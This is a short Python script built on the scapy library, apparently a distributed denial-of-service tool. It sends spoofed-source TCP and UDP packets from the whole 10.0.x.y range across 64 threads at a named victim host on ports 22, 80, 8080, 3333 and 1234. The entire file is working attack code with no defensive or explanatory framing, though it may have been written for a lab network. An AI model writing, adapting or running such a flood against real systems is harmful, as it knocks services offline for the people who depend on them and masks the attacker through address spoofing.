from scapy.all import *
from threading import Thread
from time import sleep

def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
	for i in range(subnetMin,subnetMax):
		for j in range(1,255):
			packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=victimPort)
			packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=victimPort)
			send(packetTCP)
			send(packetUDP)
			#print("victim sees 10.0." + str(i) + "." + str(j))
			time.sleep(1)


def startDDOS(victimAddress,victimPort,numThreads):
	for i in range(1,numThreads):
		threadRange = 256/numThreads
		rangeMin = i*int(threadRange) - (int(threadRange)-1)
		rangeMax = i*int(threadRange)
		for port in victimPort:
			thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,int(port)))
			thread.start()

ports = ["22","80","8080","3333","1234"]
startDDOS("eos-leaf-1",ports,64)
